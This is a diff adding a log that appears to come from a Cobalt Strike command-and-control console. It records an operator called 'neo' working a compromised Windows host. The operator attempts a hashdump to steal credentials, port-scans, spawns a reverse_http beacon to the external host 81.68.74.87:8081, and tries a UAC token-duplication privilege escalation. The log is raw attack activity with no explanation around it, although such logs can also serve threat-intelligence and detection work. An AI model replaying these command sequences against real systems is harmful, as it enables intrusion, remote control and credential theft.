@@ -1,0 +1,21 @@
+11/05 04:53:20 UTC [metadata] 14.134.57.137 <- 172.27.80.1; computer: ADMIN-LMXC; user: admin; process: beacon.exe; pid: 13380; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/05 04:53:15 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/05 04:53:15 UTC [note] Bid: 771465486  NT: 6.2
+11/05 04:53:19 UTC [checkin] host called home, sent: 16 bytes
+11/05 04:54:42 UTC [input] <neo> hashdump
+11/05 04:54:42 UTC [error] this command requires administrator privileges
+11/05 04:54:57 UTC [input] <neo> portscan null-255.255.255.255 1-1024,3389,5000-6000 none 1024
+11/05 04:54:57 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on null-255.255.255.255
+11/05 04:55:01 UTC [checkin] host called home, sent: 94807 bytes
+11/05 04:55:34 UTC [output]
+received output:
+Scanner module is complete
+
+
+11/05 04:55:44 UTC [input] <neo> spawn 黎明
+11/05 04:55:44 UTC [task] <T1093> Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (81.68.74.87:8081)
+11/05 04:55:55 UTC [input] <neo> sleep 60
+11/05 04:55:55 UTC [task] <T1029> Tasked beacon to sleep for 60s
+11/05 04:55:56 UTC [checkin] host called home, sent: 261659 bytes
+11/05 04:56:16 UTC [input] <neo> elevate uac-token-duplication 黎明
+11/05 04:56:17 UTC [task] <T1088, T1093> Tasked beacon to spawn windows/beacon_http/reverse_http (81.68.74.87:8081) in a high integrity process (token duplication)
